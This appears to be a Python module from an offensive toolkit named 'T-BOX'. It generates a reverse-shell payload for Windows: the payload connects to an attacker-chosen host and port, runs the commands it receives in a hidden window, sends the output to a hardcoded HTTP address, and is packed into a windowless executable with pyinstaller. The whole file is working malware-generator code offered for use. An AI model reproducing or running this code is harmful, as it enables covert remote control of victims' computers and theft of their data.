import os

def summon(lhost,lport):
    print('[+]正在生成py文件')
    f = open('shellcode.txt','w')
    f.write('import socket \n')
    f.write('import subprocess \n')
    f.write('import requests \n')
    f.write('sock=socket.socket() \n')
    f.write("sock.connect(('")
    f.write(lhost)
    f.write("',")
    f.write(lport)
    f.write(')) \n')
    f.write('while True: \n')
    f.write('    data = sock.recv(1024) \n')
    f.write("    da = data.decode('utf-8') \n")
    f.write('    si = subprocess.STARTUPINFO() \n')
    f.write('    si.dwFlags|= subprocess.STARTF_USESHOWWINDOW \n')
    f.write('    try: \n')
    f.write('        mProcess=subprocess.Popen(da,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,startupinfo=si) \n')
    f.write("        a = mProcess.stdout.read() \n")
    f.write('        b = a.decode("gbk") \n')
    f.write("    except: \n")
    f.write("        b = 'cmd NOT found' \n")
    f.write("    url = 'http://192.168.0.3:8080/cmd?cmd=' + b \n")
    f.write('    requests.get(url)')
    f.close()
    os.rename('shellcode.txt','shellcode.py')
    print('[+]正在打包')
    os.system('pyinstaller -F -w shellcode.py')
    print('[*]完成 R > dist/shellcode.exe')
    
    return True



lport = '4444'
lhost = '0.0.0.0'
while True:
    cmd = input('T-BOX auxiliary(summon/windows) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('        lhost     ' + lhost + '               本机IP   ')
        print('        lport     '+ lport + '             端口      ')
        print('                                                          ')
    elif cmd[:10] == 'set lhost ':
        lhost = cmd[10:]
        print('[*]lhost ==> '+lhost)
        
    elif cmd[:10] == 'set lport ':
        lport = cmd[10:]
        print('[*]lport ==> '+lport)
        
        
    elif cmd == 'run':
        if lhost == '0.0.0.0':
            print('[-]请设置本机IP')
        else:
            summon(lhost=lhost,lport=lport)

    elif cmd == '':    
            pass

    elif cmd == 'back':
        break
            
    else:
        print("[-]can't find command: " + cmd)